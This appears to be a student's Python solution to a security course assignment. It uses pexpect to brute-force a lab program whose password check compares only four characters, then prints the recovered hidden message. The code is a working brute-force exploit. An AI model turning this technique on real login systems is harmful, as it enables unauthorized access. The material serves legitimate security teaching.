
# Benny Liang | UCID: 30192142 | Assignment 3

"""
TASK 4b solution explanation
========================================================================

### how I found the vulnerability
* 

### how the script works
* I used `pexpect.popen_spawn.PopenSpawn` to start and to interact with the vulnerable program
* I started the vulnerable executable with a wrapper function `color_spawn()`, which calls `pexpect.popen_spawn.PopenSpawn`

"""

import os
import sys
from pexpect import popen_spawn
import pexpect

# debugging output controlled via DEBUG environment variable
DEBUG = os.environ.get("DEBUG", "0") in ["1", "color"]
DEBUG_COLOR = os.environ.get("DEBUG", "0").lower() == "color"

CHARACTERS_CHECKED = 4  # number of characters the `strncmp(...)` function checks (EVP_MAX_MD_SIZE >> 4 == 16 / 4 == 4)
VALID_PASSWORD_CHARS = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789' # valid characters that can be used in a password

class ColoredLog:
    """A pexpect logfile that adds color to output."""

    def __init__(self, color="1;34"):
        self.prefix = f"\033[{color}m".encode("ascii") if DEBUG_COLOR else b""
        self.suffix = b"\033[0m" if DEBUG_COLOR else b""

    def write(self, s: bytes):
        """write() method for pexpect logfile interface"""
        if DEBUG:
            sys.stdout.buffer.write(self.prefix)
            # convert s to string but escape non-printable characters with backslash escapes
            ss = ""
            for c in s:
                if chr(c) in "\\":  # escape backslash and brackets
                    ss += "\\" + chr(c)
                elif (c >= 32 and c <= 126) or (chr(c) in "\n\t"):
                    ss += chr(c)
                else:
                    ss += f"\\{c:02x}"
            sys.stdout.buffer.write(ss.encode("ascii"))
            sys.stdout.buffer.write(self.suffix)

    def flush(self):
        """flush() method for pexpect logfile interface"""
        if DEBUG:
            sys.stdout.buffer.flush()


def color_spawn(*args, **kwargs):
    """wrapper for pexpect.popen_spawn.PopenSpawn() and attaching a logger"""
    p = popen_spawn.PopenSpawn(*args, **kwargs)
    p.logfile_read = ColoredLog("1;34")
    p.logfile_send = ColoredLog("1;32")
    return p

def generate_strings(n):
    '''
    Generates strings of length `n` using characters defined in `VALID_PASSWORD_CHARS`.
    Returns a list of all possible strings of length `n`.
    '''
    
    # base case
    if n == 0:
        return ['']
    
    # recursive case: for each character, append to all strings of length n-1
    result = []
    for s in generate_strings(n - 1):   # get list of strings of length `n - 1`
        for c in VALID_PASSWORD_CHARS:  # for each string add all the char's to it (ex. s = "a", then looping (s + c) will be "aa", "ab", ..., "a0", ..., "a9")
            result.append(s + c)        # add the new string to array
    
    return result   # return the list of all possible strings of length `n` using `VALID_PASSWORD_CHARS`
    

def main(execname):
    
    """exploit the vulnerable executable using pexpect"""

    try:
        passwords_to_try_array = generate_strings(CHARACTERS_CHECKED)
        
        # debug
        # print(passwords_to_try_array)
        # print(len(passwords_to_try_array)) # this is going to be 14 776 336 elements...

        password = ""
        
        # try each password in `passwords_to_try_array`
        for x in range(0, len(passwords_to_try_array)):
        
            # start the vulnerable program
            # since popen() is not using pty, we need to use stdbuf(1)
            # to disable output buffering
            proc = color_spawn(f"stdbuf -o0 {execname}", timeout=5)

            # wait for the password prompt
            proc.expect_exact("Password:")
            # send in password
            pass_to_try = passwords_to_try_array[x]
            # print(f"trying: {pass_to_try}")   # debug
            proc.sendline(pass_to_try)
            
            try:
                proc.expect_exact("Password does not match! Bye.") # didn't find the password yet
                continue
            except Exception:
                # found the password!
                print(f'password found! `{pass_to_try}`')   # debug
                password = pass_to_try
                proc.kill(True)
                break
        
        # Recover the hidden message:
        
        # start the vulnerable program
        # since popen() is not using pty, we need to use stdbuf(1)
        # to disable output buffering
        process = color_spawn(f"stdbuf -o0 {execname}", timeout=5)
        
        # wait for the password prompt
        process.expect_exact("Password:")
        # send in password
        process.sendline(password)
        
        # recover the hidden message
        # notice that with popen_spawn we can use \n line endings
        process.expect_exact("-----BEGIN HIDDEN MESSAGE-----\n")
        process.expect_exact("-----END HIDDEN MESSAGE-----")
        hidden_message = process.before.decode("ascii").rstrip()
        # optional: read the remaining output of the program one line at a time until <EOF>
        process.expect(pexpect.EOF, timeout=8)

        # print out the recovered hidden message
        print("Recovered hidden message:", hidden_message)

    except Exception:  # pylint: disable=broad-except
        print("Exploit failed.")
        if DEBUG:
            raise


if __name__ == "__main__":
    main(sys.argv[1])
